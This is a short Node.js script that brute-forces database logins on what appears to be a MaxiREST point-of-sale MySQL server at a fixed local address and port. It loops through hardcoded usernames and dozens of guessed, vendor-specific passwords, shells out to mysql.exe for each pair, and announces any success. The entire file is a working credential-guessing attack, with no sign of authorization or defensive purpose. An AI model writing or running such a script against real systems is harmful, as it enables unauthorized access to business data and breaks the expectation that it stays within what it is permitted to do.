const { execSync } = require('child_process');

const passwords = [
  '', '10783', 'mx_10783', 'user_10783', 'maxirest', 'Maxirest', 'MAXIREST',
  'masterkey', 'admin', 'Admin', 'caja', 'CAJA', '1234', '123456', 'root',
  'gastro', 'gastromarket', 'market', 'soporte', 'soporte123', 'maxi10783',
  'maxi', 'Maxi', 'mrest', 'mxt', 'sql', 'mariadb', '27366', 'mx_27366',
  'prorental', 'rental', 'rental7', 'rental73', '7.3', '73', '7.1', '71'
];

const users = ['ADMTOM', 'user_10783', 'root', 'maxirest', 'caja'];

let found = false;

for (const u of users) {
  for (const p of passwords) {
    try {
      const pFlag = p === '' ? '' : `-p"${p}"`;
      const cmd = `C:\\MaxiREST_SQL\\mysql.exe -h 192.168.1.4 -P 3399 -u ${u} ${pFlag} -e "SELECT 1;"`;
      const out = execSync(cmd, { encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] });
      console.log(`🎉🎉🎉 SUCCESS! User: ${u}, Password: "${p}"`);
      console.log(out);
      found = true;
      break;
    } catch(e) {}
  }
  if (found) break;
}

if (!found) {
  console.log(`Tested ${users.length * passwords.length} combinations. None matched directly.`);
}
